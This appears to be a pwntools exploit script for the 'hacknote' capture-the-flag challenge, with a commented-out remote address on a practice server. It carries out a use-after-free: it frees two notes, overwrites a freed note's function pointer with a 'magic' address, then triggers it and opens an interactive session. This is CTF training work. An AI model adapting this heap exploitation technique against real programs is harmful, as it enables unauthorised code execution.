from pwn import *
context.log_level="debug"
io=process("./hacknote")
#io=remote("node4.buuoj.cn",27728)
def add(size,content):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil("size :")
    io.sendline(str(size))
    io.recvuntil("Content :")
    io.sendline(content)

def delete(index):
    io.recvuntil("Your choice :")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(index))

def print_(index):
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil("Index :")
    io.sendline(str(index))
magic=0x08048945
add(30,"HAPPY")
add(30,"HAPPY")
add(30,"HAPPY")
delete(1)
delete(2)
add(8,p32(magic))
#gdb.attach(io)
#pause()
print_(1)
#gdb.attach(io)
#pause()
io.interactive()
